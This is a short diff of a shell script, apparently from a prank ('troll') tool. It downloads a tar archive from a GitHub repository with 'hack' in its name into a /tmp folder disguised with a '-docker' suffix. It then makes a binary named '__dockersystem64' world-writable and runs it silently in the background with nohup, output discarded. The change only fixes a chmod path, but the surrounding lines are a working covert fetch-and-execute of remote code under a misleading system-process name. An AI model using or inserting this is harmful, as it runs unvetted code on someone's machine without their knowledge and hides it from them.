@@ -9,7 +9,7 @@ dir=/tmp/ ; dir+=`whoami` ; dir+='-docker' ; mkdir -p $dir
 curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o $dir/proutsh42.tar
 tar -xvf $dir/proutsh42.tar -C $dir
 cd $dir
-chmod 777 ./__dockersystem64
+chmod 777 $dir/__dockersystem64
 #chmod 777 ./prout_troll
 #chmod last modif time of all files
 (nohup ./__dockersytem64 $init_tempo $tempo $tempo_offset $volume $volume_offset &> /dev/null &)
